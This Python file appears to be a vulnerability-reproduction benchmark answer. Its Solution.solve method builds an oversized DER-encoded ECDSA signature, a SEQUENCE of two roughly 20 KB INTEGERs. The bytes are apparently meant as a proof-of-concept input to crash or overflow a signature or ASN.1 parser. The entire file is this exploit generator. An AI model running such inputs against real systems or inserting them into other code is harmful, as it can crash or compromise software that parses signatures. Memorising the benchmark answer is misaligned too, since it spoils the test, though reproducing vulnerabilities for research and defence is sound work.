import os


class Solution:
    def solve(self, src_path: str) -> bytes:
        total_len = 41798
        int_value_len = 20893
        payload_len = 2 * (4 + int_value_len)

        # Sanity check on lengths (kept as regular logic, not assert, to avoid accidental failure)
        if 4 + payload_len != total_len:
            # Fallback: recompute consistently if above constants were altered
            int_value_len = (total_len - 12) // 2
            payload_len = 2 * (4 + int_value_len)

        buf = bytearray()

        # Top-level SEQUENCE
        buf.append(0x30)
        buf.append(0x82)
        buf.append((payload_len >> 8) & 0xFF)
        buf.append(payload_len & 0xFF)

        # Two large INTEGERs (r and s)
        for _ in range(2):
            buf.append(0x02)  # INTEGER tag
            buf.append(0x82)  # length uses 2 bytes
            buf.append((int_value_len >> 8) & 0xFF)
            buf.append(int_value_len & 0xFF)
            buf.extend(b"\x01" * int_value_len)  # value bytes, MSB not set

        return bytes(buf)